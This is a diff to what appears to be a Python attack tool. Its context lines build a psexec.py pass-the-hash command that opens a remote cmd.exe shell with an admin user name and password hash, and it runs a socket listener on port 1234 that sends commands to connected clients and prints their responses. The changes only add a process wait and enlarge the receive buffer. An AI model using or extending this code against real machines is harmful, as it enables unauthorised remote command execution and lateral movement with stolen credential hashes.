@@ -9,7 +9,8 @@ def connectToMachine():
     userName = input("Enter the name of the user with admin rights: ")
     dir = os.getcwd()
     cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
-    subprocess.Popen(cmnd, cwd=dir, shell=True)
+    proc = subprocess.Popen(cmnd, cwd=dir, shell=True)
+    proc.wait()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", 1234))
@@ -39,7 +40,7 @@ while True:
 
     clientsocket.send(bytes(msgToSend,"utf-8"))
     #this does not work currently since it gets an error
-    msg = clientsocket.recv(1024)
+    msg = clientsocket.recv(2048)
     decodedMsg = msg.decode("utf-8")
     print(decodedMsg)
 
